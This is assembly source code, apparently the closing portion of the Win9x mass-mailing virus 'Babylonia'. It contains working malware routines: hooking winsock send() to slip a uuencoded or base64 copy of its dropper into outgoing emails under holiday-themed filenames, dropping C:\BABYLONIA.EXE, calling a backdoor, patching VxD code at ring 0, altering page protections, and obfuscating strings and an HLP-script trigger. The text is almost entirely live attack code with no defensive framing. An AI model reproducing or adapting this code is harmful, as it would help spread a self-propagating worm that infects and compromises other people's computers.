          cmp dwo [ebp+(ofs i_jmp-ofs vcode)], 0
          je @@pe_exe

          add esp, wsize
          popa
          popf
          add esp, (ofs vend-ofs vcode)
          sub eax, eax                            ;stop enumeration
          ret 8                                   ;return to callback
     @@pe_exe:
          lea eax, [esp+wsize+(9*4)]
          mov edi, [eax]
          sub edi, 5                              ;return place
          mov [eax], edi
          mov al, not 0b8h
     instr1 equ by $-1
          not eax
          stosb
          mov eax, 12345678h
     instr2 equ dwo $-4
          not eax
          stosd
          add esp, wsize
          popa
          popf
          ret                                     ;return to same place!
   virusmain endp


   hlp1_s = $
          dw 4
          dw (ofs _label1-ofs _label2)
   _label2 = $
          db "RR(`USER32.DLL',`EnumWindows',`SU')", 0
   _label1 = $

          dw 4
   _size  dw 0
   p1     = $
          db "EnumWindows(`"
   hlp1_e = $
   hlp1_sz = hlp1_e-hlp1_s
          jmp esp
          db "',666)", 0                          ;29A
   hlp2_e = $
   hlp2_sz = hlp2_e-hlp1_e


   check  proc
          call checkv
          jc @@again_1
          sub edx, edx
          ret
     @@again_1:
          mov ebx, eax
     @@again:
          mov eax, ebx
          call rnd
          xor eax, edx
          call checkv                             ;eax was validated?
          jc @@again
          xchg eax, edx                           ;edx is valid modifier?
          call checkv
          jc @@again
          xchg edx, eax
          ret
   check  endp


   rnd    proc
          call @@2
          dd 12345678h
     @@2:
          pop edx
          sub [edx], 12345678h
        org $-4
   v2     dd 87654321h
          mov edx, [edx]
          xor [ebp+(ofs v2-ofs vcode)], edx       ;get rnd number
          ret
   rnd    endp


   checkv proc
          pusha
          push 4
          pop ecx
     @@1:
          cmp al, ' '
          jbe @@error
          cmp al, 0f0h
          ja @@error
          cmp al, '"'
          jz @@error
          cmp al, "'"
          jz @@error
          cmp al, "`"
          jz @@error
          cmp al, "\"
          jz @@error
          ror eax, 8                              ;check for invalid characters
          loop @@1                                ;for hlp script
          clc
          mov cl, 12h
        org $-1
     @@error:
          stc
          popa
          ret
   checkv endp


   open   proc
          call getatt
          mov [ebp+(ofs attr-ofs vcode)], eax
          sub ecx, ecx
          call setatt
          mov [ebp+(ofs fname-ofs vcode)], esi
          mov eax, 0D500h
          push 1h
          sub ecx, ecx
          mov ebx, 2022h
          pop edx
          call io
          mov [ebp+(ofs handle-ofs vcode)], eax
          ret
   open   endp


   getsize proc
          mov eax, 0D800h
    __2_:
          jmp __2__
   getsize endp


   close  proc
          mov eax, 0D700h
          call __2_
          mov ecx, 12345678h
     attr equ dwo $-4
          mov esi, 12345678h
     fname equ dwo $-4                             ;set old file attribute
   close  endp


   setatt proc
          mov eax, 4301h
     __2__:
          jmp __2___
   setatt endp


   getatt proc
          mov eax, 4300h
     __2___:
          jmp __2
   getatt endp


   write  proc
          mov eax, 0D601h
          jmp __2___
   write  endp


   read   proc
          mov eax, 0D600h
     __2:
          mov ebx, 12345678h
     handle equ dwo $-4
   read   endp


   io     proc
          call delta
          mov [ebp+(ofs eax_value-ofs vcode)], eax
          mov eax, 00400032h                          ;Ring0_IO
          xchg eax, [esp]
          push eax
   io     endp


   vxd    proc
          pop eax
          call delta
          mov wo [ebp+(ofs @@int-ofs vcode)], 20cdh
          sub eax, ebp
          add eax, -((ofs @@jmp-ofs vcode)+4)
          mov [ebp+(ofs @@jmp-ofs vcode)], eax
          pop dwo [ebp+(ofs @@address-ofs vcode)] ;dynamic VxDCall building
          mov eax, 12345678h
       eax_value equ dwo $-4
     @@int:
          int 20h
     @@address dd 0
          db 0e9h
     @@jmp dd 0
   vxd    endp


   bound_ db 'OUNDARY="'
   bound_sz = $-ofs bound_
          db 0

   rva2raw proc
          push esi
          push ecx
          push ebx
          lea esi, [esp+section+(4*4)]            ;first section
          movzx ecx, wo [esp+pe_hdr+6+(4*4)]
     @@section:
          mov ebx, eax
          sub ebx, [esi+12]
          cmp [esi+8], ebx
          jae @@found                             ;point inside section
          sub esi, -40
          loop @@section
          sub ebx, ebx                            ;signal error
          jmp @@error
     @@found:
          add ebx, [esi+20]                       ;convert to raw
     @@error:
          mov eax, ebx
          pop ebx
          pop ecx
          pop esi
          ret
   rva2raw endp


   check_size proc
          test eax, eax
          jz @@error
          cmp eax, 2*1024*1024
          jae @@error                             ;bigger than 2mb
          cmp eax, 8*1024
          jbe @@error                             ;smaller than 4kb
          sub edx, edx
          push 17
          pop ecx                                 ;if((fsize mod 17) = 15)
          div ecx                                 ;lexo32 ;-)
          sub edx, 15
          db 066h, 0b8h                           ;mov ax, ?
     @@error:
          sub eax, eax
          ret
   check_size endp


   pstart equ this byte                           ;wsock32.dll code...

          dd 0
          db 'C:\_'
   driver db 8 dup (0)                          ;drivername
          db '.---', 0

   send   proc
          call init2
          mov eax, 12345678h
        _send equ dwo $-4
          jmp eax                                 ;jmp to hmem send
   send   endp


   init2  proc
          cld
          pusha
          call @@delta
     @@delta:
          pop ebp
          add ebp, -(ofs @@delta-ofs pstart)      ;get delta in wsock32.dll
          mov ebx, ebp
          lea edi, [ebx+(ofs driver-ofs pstart)]
          push 8
          pop ecx
     @@byte:
          rol ebx, 4
          mov al, bl
          and al, 01111b                          ;convert address to filename
          add al, 'A'
          stosb
          loop @@byte
          add ebx, 4
          push ebx
          db 0b8h
     _getfattr dd 0                               ;call backdoor
          call eax
          mov eax, 90909090h
          lea edi, [ebp+((ofs send-ofs pstart))]
          stosd                                   ;clean calls to install
          stosb
          mov eax, [ebp]                          ;get ring0 interface code
          test eax, eax
          jz @@damaged                            ;cant get the interface
          mov [ebp+(ofs _send-ofs pstart)], eax   ;set jmps to my hmem handlers
     @@damaged:
          popa
          ret
   init2  endp

   pend   equ this byte


   include unpack.inc


   ScanVxd proc
          pusha
          mov edi, [ebx+0C0000018h]               ;Control_Proc_0
     @@page:
          lea ecx, [edi+4]                        ;check presence for
          test ecx, 00000FFFh
          jz @@check                              ;to each new page encountered
     @@mov:
          inc edi
          cmp [edi], esi                          ;B8 <esi>
          jne @@page
          cmp by [edi-1], 0B8h
          jne @@page
          mov dwo [edi], -1                       ;R0_xxx <-- 0xFFFFFFFF
          jmp @@page
     @@check:
          pusha
          sub esp, 28
          mov esi, esp
          push 28
          push esi                                ;esi = MEMORY_BASIC_INFO
          push ecx
          push 00010134h
          call vxd                                ;VMMcall PageQuery
          bt dwo [esi+10h], 3                     ;mbi_state & MEM_COMMIT
          lea esp, [esp+4*3+28]
          popa
          jc @@mov                                ;will not fault?
          popa
          ret
   ScanVxd endp


        IF DEBUG EQ TRUE
   dropname db 'C:\GOAT.EXE', 0
        ELSE
   dropname db 'C:\BABYLONIA.EXE', 0
        ENDIF


   myname     dd 0
   mem_temp   dd 0
   mem        dd 0
   sent       dd 0
   uudropper  dd 0
   uusize     dd 0
   b64dropper dd 0
   b64size    dd 0


   my_send  proc
          call init
          pusha
          call delta
          mov esi, [esp+(8*4)+(1*4)+4]          ;send() buffer
          db 0b9h
     socket_out dd 0                           ;we're monitoring a specific socket?
          jecxz @@all
          cmp [esp+(8*4)+(1*4)+0], ecx     ;if so, then make sure is our
          je @@monitor
          jmp @@done

     @@all:
          cmp [esi], 'ATAD'                       ;email is being send!
          jne @@done
          mov eax, [esp+(8*4)+(1*4)+0]            ;monitor this socket only now
          mov [ebp+(ofs socket_out-ofs vcode)], eax
          sub eax, eax
          mov [ebp+(ofs boundary-ofs vcode)], eax ;init MIME fieldz
          mov [ebp+(ofs sent-ofs vcode)], eax
          jmp @@done

     @@monitor:
          mov ecx, [esp+(8*4)+(1*4)+8]            ;size
          mov edi, esi
          mov al, '.'                             ;search .
          push ecx
     @@cont_dot:
          repne scasb                          ;not end_of_email yet
          jne @@no_dot                         ;so, check for MIME
          cmp dwo [edi-2], 0a0d2e0ah
          jne @@cont_dot                     ;make sure is the end_of_email sign
          pop ecx                          ;ecx=size of buffer
          call uu_send
          sub eax, eax                           ;ready to infect next email
          mov [ebp+(ofs socket_out-ofs vcode)], eax
          jmp @@done                              ;send the .

     @@no_dot:
          pop ecx
          dec ecx                                 ;monitor MIME emailz
          dec ecx
          dec ecx                                 ;size-3, since we load DWORDs
          test ecx, ecx
          js @@done                               ;buffer smaller than 2, exit!
     @@scan:
          push ecx
          lodsd
          dec esi
          dec esi
          dec esi
          push esi
          and eax, not 20202020h               ;eax=upcase of 1st 4 letterz
          db 0bah
     boundary dd 0
          test edx, edx                         ;we already found the boundary?
          jnz @@boundary_found
          sub eax, 'NUOB'
          jnz @@bogus                             ;maybe a boundary?
          lea edi, [ebp+(ofs bound_-ofs vcode)]
     @@loop_1:
          cmp by [edi], ah
          je @@done_1
          lodsb
          cmp al, 'a'
          jb @@up
          cmp al, 'z'                             ;check string
          ja @@up
          and al, not 20h
     @@up:
          inc edi
          not al
          cmp by [edi-1], al
          je @@loop_1
     @@done_1:
          jne @@bogus
          mov edi, [ebp+(ofs mem-ofs vcode)]   ;copy MIME boundary to buffer
          mov [ebp+(ofs boundary-ofs vcode)], edi
     @@next_b:
          lodsb
          cmp al, '"'
          je @@copied
          stosb
          jmp @@next_b
     @@copied:
          sub eax, eax                            ;now we have all we need for
          stosd                                   ;a perfect send :)
          jmp @@bogus

     @@boundary_found:
          push esi
          dec esi
          dec ecx
          sub eax, eax                            ;search for boundary
     @@match:
          lodsb
          inc edx
          cmp by [edx], ah
          je @@is_boundary
          cmp by [edx], al                         ;compare stringz
          je @@match
     @@is_boundary:
          xchg edi, esi                           ;edi=end of boundary+1
          pop esi
          jne @@bogus                             ;end reached and all match?
          cmp al, '-'
          jne @@bogus
          scasb                                   ;found last boundary!
          jne @@bogus
          pop eax                                 ;fix stack
          mov [esp], edi
          mov wo [edi-2], 0A0Dh                   ;turn to normal boundary
          sub edi, [esp+(8*4)+(1*4)+4+4]             ;subtract buffer address
          xchg [esp+(8*4)+(1*4)+8+4], edi         ;new size
          mov [ebp+(ofs eax_value2-ofs vcode)], edi     ;save old for return
          push dwo [esp+(8*4)+(1*4)+8+4]  ;size
          push dwo [esp+(8*4)+(1*4)+8+4]  ;buffer
          call safesend
          pop edi                               ;interception point
          mov wo [edi-2], '--'              ;restore user buffer
          mov [ebp+(ofs eax_value2-ofs vcode)], eax
          jc @@error
          call uu_send
          mov eax, [ebp+(ofs eax_value2-ofs vcode)] ;how much they want send
          mov ebx, [esp+(8*4)+(1*4)+8]     ;how much we already send
          sub eax, ebx
          jz @@gran_finale                 ;done
          mov [esp+(8*4)+(1*4)+8], eax     ;send rest
          add [esp+(8*4)+(1*4)+4], ebx     ;starting from last send byte
          push dwo [esp+(8*4)+(1*4)+8]  ;size
          push dwo [esp+(8*4)+(1*4)+8]  ;buffer
          call safesend               ;send the remainder of user buffer
          jc @@error
     @@gran_finale:
          mov edi, [ebp+(ofs boundary-ofs vcode)]
          mov esi, edi
     @@next1:
          lodsb
          test al, al
          jnz @@next1                          ;search end
          xchg edi, esi
          dec edi
          add al, '-'
          stosb                                   ;make last boundary
          stosb
          sub edi, esi                             ;calculate the size
          push edi                         ;size
          push esi
          call safesend            ;send last boundary
     @@error:
          popa
          db 0b8h
      eax_value2 dd 0                              ;return no error
          ret 4*4

     @@bogus:
          pop esi
          pop ecx
          dec ecx
          jnz @@scan                              ;bahh... to far to a loop
     @@done:
          popa
          mov eax, 12345678h
     oldsend equ dwo $-4
          jmp eax
   my_send  endp


   script db 'Content-Type: application/octet-stream; name="', 1, '"', 13, 10
          db 'Content-Disposition: attachment; filename="', 1, '"', 13, 10
          db 'Content-Transfer-Encoding: base64', 13, 10, 13, 10
          db 0
   script_sz = $-ofs script


   uu_send proc
          pusha
          sub eax, eax
          cmp [ebp+(ofs sent-ofs vcode)], eax
          jne @@already
          mov edi, [ebp+(ofs boundary-ofs vcode)]
          cmp edi, eax
          je @@skip_header
          add edi, 100h            ;work after boundary
          push edi
          lea esi, [ebp+(ofs script-ofs vcode)]
     @@expand:
          lodsb
          not al
          test al, al
          jz @@send_header
          cmp al, 1
          jnz @@name
          call ninsert                             ;insert exe name
          db 0b0h
     @@name:
          stosb
          jmp @@expand
     @@send_header:
          pop esi
          sub edi, esi
          push edi                 ;size
          push esi                 ;buffer
          call safesend                            ;send mime header
          jc @@fuxkx
          mov edi, [ebp+(ofs b64size-ofs vcode)]
          mov esi, [ebp+(ofs b64dropper-ofs vcode)]
          jmp @@block
     @@skip_header:
          mov edi, [ebp+(ofs uusize-ofs vcode)]
          mov esi, [ebp+(ofs uudropper-ofs vcode)]
     @@block:
          mov eax, 4*1024                  ;block size=4kb
          cmp eax, edi
          jb  @@low
          mov eax, edi                     ;send the remainder
     @@low:
          push eax                         ;size
          push esi                         ;buffer
          call safesend
          jc @@fuxkx
          add esi, eax
          sub edi, eax
          jnz @@block                      ;blockz left?
     @@fuxkx:
          mov [ebp+(ofs sent-ofs vcode)], ebp
     @@already:
          popa
          ret
   uu_send endp


   init   proc
          pusha
          cld
          sub eax, eax
          call delta
          cmp [ebp+(ofs mem-ofs vcode)], eax
          jne @@inited                     ;we already inited our dropper?
          mov eax, [ebp+(ofs mem_temp-ofs vcode)]
          mov [ebp+(ofs mem-ofs vcode)], eax
          test eax, eax
          jz @@inited
          push eax
          call @@over

   include dropper.inc

     @@over:
          call _aP_depack_asm                     ;unpack dropper data

          add esp, -8*2
          push esp
          db 0b8h
     _gsystime dd 0
          call eax
          mov bl, [esp+(1*2)]                      ;bh=month
          add esp, 8*2

          push 6
          lea esi, [ebp+(ofs dates-ofs vcode)]
          lea ecx, [ebp+(ofs name0-ofs vcode)]
          mov [ebp+(ofs myname-ofs vcode)], ecx
          pop ecx
     @@next_date:
          lodsw
          cmp ah, bl
          je @@is
          cmp bl, al
          jne @@nope                        ;this holiday isnt this month
     @@is:
          pusha
          mov edi, [ebp+(ofs mem-ofs vcode)]
          add edi, icon                    ;where icon should go in dropper
          mov esi, edi
          add esi, (ofs coelho-icon)      ;first icon
          mov eax, 1152
          xchg eax, ecx                   ;eax=count ecx=size icon
          dec eax
          lea edx, [ebp+(ofs names-ofs vcode)]
          mov edx, [edx+(eax*4)]
          add edx, ebp
          mov [ebp+(ofs myname-ofs vcode)], edx   ;get dropper name
          cdq
          mul ecx                          ;count*size+base=new icon
          add esi, eax
          rep movsb                                ;install new icon
          popa
     @@nope:
          loop @@next_date                        ;check next date

          push 2
          lea esi, [ebp+(ofs dropname-ofs vcode)]
          pop ecx
          call r3_open
          jz @@fux0r
          push DROPPER_SIZE
          mov esi, [ebp+(ofs mem-ofs vcode)]
          pop ecx
          call r3_write                    ;write clean dropper
          call r3_close
          push 3
          lea esi, [ebp+(ofs dropname-ofs vcode)]
          pop ecx
          call r3_open
          jz @@fux0r1
          call r3_seof                            ;get new dropper size
          cmp eax, DROPPER_SIZE
          je @@fux0r2                              ;was infected?
          push eax
          call r3_ssof
          mov edi, [ebp+(ofs mem-ofs vcode)]
          mov ecx, [esp]
          lea eax, [edi+ecx]
          push edi
          push eax
          call r3_read                            ;read infected dropper
     @@fux0r2:
          call r3_close

     @@fux0r1:
          lea eax, [ebp+(ofs dropname-ofs vcode)]
          push eax
          db 0b8h
     _fdelete dd 0
          call eax
          pop edi                         ;edi=uuencode buffer
          mov esi, [esp]                  ;esi=image
          mov ecx, [esp+4]                ;ecx=size
          call uuencode
          call delta
          mov [ebp+(ofs uudropper-ofs vcode)], edi
          mov [ebp+(ofs uusize-ofs vcode)], ecx
          pop esi                          ;esi=image
          lea edi, [edi+ecx]
          pop eax                             ;eax=size
          call BASE64
          mov [ebp+(ofs b64dropper-ofs vcode)], edi
          mov [ebp+(ofs b64size-ofs vcode)], ecx

          lea eax, [ebp+(ofs wsock-ofs vcode)]
          push eax
          db 0b8h
     _getmhandle dd 0
          call eax
          mov edi, [ebp+(ofs _getproc-ofs vcode)]    ;eax=wsokc32 base

          call @@112
          db 'WSAGetLastError', 0
     @@112:
          push eax
          call edi
          mov [ebp+(ofs _WSAGetLastError-ofs vcode)], eax
          jmp @@inited

     @@fux0r:
          sub eax, eax
          mov [ebp+(ofs mem-ofs vcode)], eax
     @@inited:
          popa
          ret
   init   endp


   decript_names proc
          pusha
          call delta
          lea edi, [ebp+(ofs name0-ofs vcode)]
          push name_sz
          pop ecx
          mov esi, edi
     @@999:
          lodsb
          not al                           ;crypt/decrypt
          stosb
          loop @@999
          popa
          ret
   decript_names endp


   ninsert proc
          pusha
          call decript_names
          mov esi, [ebp+(ofs myname-ofs vcode)]
     @@next:
          lodsb
          stosb
          test al, al
          jnz @@next
          dec edi
          mov eax, not 'EXE.'
          not eax
          stosd
          mov [esp], edi
          call decript_names
          popa
          ret
   ninsert endp


   dates  equ this byte
          db 06, 07                    ; BABILONIA   - US FLAG
          db 12, 12                    ; NAVIDAD     - Papai Noel
          db 04, 04                    ; PASCOA      - Ovo
          db 01, 01                    ; REYES MAGOS - Jesus
          db 10, 11                    ; HALLOWEN    - Abobora
          db 03, 03                    ; PASCOA2     - Coelho


   name0  db 'I-WATCH-U', 0            ;default name
   name1  db 'BABILONIA', 0
   name2  db 'X-MAS', 0
   name3  db 'SURPRISE!', 0
   name4  db 'JESUS', 0
   name5  db 'BUHH', 0
   name6  db 'CHOCOLATE', 0
   name_sz = $-ofs name0


   names  equ this byte
          dd (ofs name6-ofs vcode)
          dd (ofs name5-ofs vcode)
          dd (ofs name4-ofs vcode)
          dd (ofs name3-ofs vcode)
          dd (ofs name2-ofs vcode)
          dd (ofs name1-ofs vcode)
          dd 0


   r3_open proc
          sub eax, eax
          push eax
          push 22h
          push ecx
          push eax
          push eax
          push 0c0000000h
          push esi
          mov eax, 12345678h
     _openfile equ dwo $-4
          call eax                                ;CreateFileA
          mov [ebp+(ofs r3handle-ofs vcode)], eax
          inc eax
          ret
   r3_open endp


   r3_close proc
          push 12345678h
        org $-4
     r3handle dd 0
          mov eax, 12345678h
     _closehandle equ dwo $-4
          call eax                                ;CloseHandle
          ret
   r3_close endp


   r3_write proc
          push 0
          call @@1
          dd 0
     @@1: push ecx
          push esi
          push dwo [ebp+(ofs r3handle-ofs vcode)]
          mov eax, 12345678h
     _writefile equ dwo $-4
          call eax                                ;WriteFile
          ret
   r3_write endp


   r3_read proc
          push 0
          call @@1
          dd 0
     @@1: push ecx
          push edi
          push dwo [ebp+(ofs r3handle-ofs vcode)]
          mov eax, 12345678h
     _readfile equ dwo $-4
          call eax                                ;WriteFile
          ret
   r3_read endp


   r3_ssof proc
          push 0
          db 66h,0b8h
   r3_seof proc
          push 2
          push 0
          push 0
          push dwo [ebp+(ofs r3handle-ofs vcode)]
          mov eax, 12345678h
     _seekfile equ dwo $-4
          call eax
          ret
   r3_seof endp
   r3_ssof endp


   ;UUENCODE
   ;ESI=Data to encode
   ;EDI=Buffer
   ;ECX=Size of data
   uuencode proc
          cld
          push edi
          push esi
          push ecx
          mov eax, 065620A0Dh
          stosw
          stosd
          mov eax, not ' nig'
          not eax
          stosd
          mov eax, not ' 446'
          not eax
          stosd
          call ninsert                            ;insert dropper name
          mov ax, 0A0Dh
          stosw
          mov eax, [esp]                          ;eax=size
          cdq
          push 45
          pop ebx
          div ebx                                 ;dl=rest in last line
          mov ecx, eax                            ;ecx=number of lines
          pop ebp                                 ;esi=start of data
          pop esi
          add ebp, esi                            ;ebp=end of data
     @@line:
          push ecx
          mov al, "M"                             ;start of line
          stosb
          push 15
          pop ecx                                 ;read 15*3 => write 15*4
     @@octet:
          call getbyte
          shr al, 2
          call convert                            ;1st char
          shl al, 4
          and al, 00110000b
          mov bh, al
          call getbyte
          shr al, 4
          and al, 00001111b
          or al, bh
          call convert                            ;2nd char
          shl al, 2
          and al, 11111100b
          mov bh, al
          call getbyte
          shr al, 6
          and al, 00000011b
          or al, bh
          call convert                            ;3th char
          call convert                            ;4th char
          loop @@octet
          mov ax, 0A0Dh
          stosw
          pop ecx
          loop @@line                             ;do next line
          mov eax, edx
          test al, al
          jz @@end
          add al, 20h                             ;do remainder
          stosb
          xor eax, eax
          mov al, dl
          xor edx, edx
          xor ecx, ecx
          push 3
          pop ebx
          div ebx
          mov ecx, eax
          test edx, edx
          jz @@no_rest
          inc cx                                  ;octets to make
     @@no_rest:
          push 1                                  ;is last line
          sub edx, edx                            ;with no rest
          jmp @@octet
     @@end:
          mov eax, 0650A0D60h                     ;"end"
          stosd
          mov eax, 00A0D646Eh
          stosd
          shr eax, 16                      ;cr+lf
          stosw
          pop ecx
          sub edi, ecx
          xchg edi, ecx
          ret
   uuencode endp


   wsock  db 'WSOCK32.DLL', 0


   convert proc
          and al, 00111111b
          jnz @@0
          add al, 40h
     @@0:
          add al, 20h
          stosb
          mov al, ah
          ret
   convert endp


   getbyte proc
          cmp esi, ebp                            ;end of buffer?
          jne @@load
          xor al, al
          db 0b4h                                 ;skip LODSB
     @@load:
          lodsb
          mov ah, al                              ;backup
          ret
   getbyte endp


   protect proc
          inc ecx
          add ecx, 4096                           ;tnz again to z0mbie!
          shr ecx, 12
          test ebx, 4095
          jnz @@forget
          shr ebx, 12
          push 0
          push not (00020000h+00040000h)          ;not writeable+user
          push ecx
          push ebx
          push 00010133h        ;PageModifyPermissions
          call vxd
          add  esp, 4*4
     @@forget:
          ret
   protect endp


   safesend proc
          pusha
     @@retry:
          mov eax, [esp+4+(8*4)]
          mov ecx, [esp+8+(8*4)]
          push 0
          push ecx                 ;size
          push eax                 ;buffer
          push dwo [ebp+(ofs socket_out-ofs vcode)]
          call [ebp+(ofs oldsend-ofs vcode)]
          mov ecx, eax
          inc ecx
          jnz @@done
          db 0b8h
     _WSAGetLastError dd 0
          call eax
          sub eax, 10035                            ;EWOULDBLOCK?
          jz @@retry
          stc                              ;error
          db 0b1h
     @@done:
          clc
          mov [esp+(7*4)], eax
          popa
          ret 2*4
   safesend endp


   ;esi=input
   ;edi=output
   ;eax=size
   BASE64 proc
          cld
          push edi
          push 3
          call @@trans
   trans_table = $
          db 'A','B','C','D','E','F','G','H','I','J'
          db 'K','L','M','N','O','P','Q','R','S','T'
          db 'U','V','W','X','Y','Z','a','b','c','d'
          db 'e','f','g','h','i','j','k','l','m','n'
          db 'o','p','q','r','s','t','u','v','w','x'
          db 'y','z','0','1','2','3','4','5','6','7'
          db '8','9','+','/'
   chars dd ?                            ;contador de caracteres
     @@trans:
          pop ebx
          push (ofs chars-ofs trans_table)
          pop ecx
     @@1:
          not by [ebx+ecx-1]                      ;crazy, isnt? ;)
          loop @@1       ;now, imagine what i can do if i wasnt stoned all time
          pop ecx
          cdq
          mov dwo [ebx+ecx+((ofs chars-ofs trans_table)-3)], edx  ;tricky ;)
          div ecx
          mov ecx, eax
          push edx
      @@loop:
          lodsd
          dec esi                              ;edx=original
          mov edx, eax                         ;edx=work copy
          call Temp
          call CODE64Block3
          call CODE64Block4
          loop @@loop
          pop ecx              ;get rest
          jecxz @@done
          lodsd
          dec ecx
          jz @@rest1
          movzx edx, ax                            ;use only 2 bytes
          call Temp
          call CODE64Block3
          jmp @@end
      @@rest1:
          movzx edx, al                            ;use 1 byte only
          call Temp
          inc ecx
          inc ecx
      @@end:
          mov al, '='
          rep stosb
      @@done:
          mov eax, 0A0D0A0Dh
          stosd
          push (ofs chars-ofs trans_table)
          pop ecx
     @@2:
          not by [ebx+ecx-1]
          loop @@2
          pop ecx
          sub edi, ecx                            ;edi=buffer
          xchg ecx, edi                           ;ecx=size
          ret
   BASE64 endp


   Temp   proc
          call CODE64Block1                ;little optimizing routine
          call CODE64Block2
          ret
   Temp   endp


   CODE64Block1:
          mov eax, edx
          shr eax, 02h
     process3:
          jmp process

   CODE64Block2:
          mov eax, edx
          shl al, 04h
          shr ah, 04h
     process2:
          or al, ah                        ;chained jmps
          jmp process3             ;another "why make it easy?" (c) Vecna ;)

   CODE64Block3:
          mov eax, edx
          shr eax, 08h
          shl al, 02h
          shr ah, 06h
          jmp process2

   CODE64Block4:
          mov eax,edx
          shr eax,10h

     process:
          and al,00111111b
          xlatb
          stosb
          mov eax, dwo [ebx+(ofs chars-ofs trans_table)]
          inc eax
          mov dwo [ebx+(ofs chars-ofs trans_table)], eax
          pusha
          push 0000004Ch
          pop ecx
          cdq
          div ecx
          test edx, edx
          popa
          jnz @@noline
          mov ax, 0A0Dh
          stosw
      @@noline:
          ret

   align 4


   vend   equ this byte

          db 'EOV', 0

   _VIRUS ends

   end    main
